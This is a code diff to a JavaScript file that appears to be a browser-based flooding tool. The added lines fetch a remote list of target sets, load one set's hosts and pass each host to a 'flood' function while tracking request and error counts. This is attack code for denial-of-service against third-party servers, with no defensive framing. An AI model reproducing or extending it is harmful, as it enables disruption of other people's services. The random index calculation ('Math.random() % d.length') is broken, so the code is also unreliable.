@@ -79,6 +79,21 @@ async function flood(target) {
 
 fetch(targetsURL + "targets.json").then((r) => {
     r.json().then((d) => {
-        console.log(d);
-    })
-})
+        rand = Math.random() % d.length
+        const element = d[rand]
+        descEl.innerHTML = element["description"];
+        fetch(targetsURL + element['name'] + ".txt").then((r) => {
+            r.text().then((d) => {
+                let targets = d.split('\n');
+                targets.forEach((target) => {
+                    targetStats[target] = {
+                        number_of_requests: 0,
+                        number_of_errored_responses: 0,
+                        last_responses: []
+                    }
+                })
+                targets.map(flood);
+            });
+        });
+    });
+});
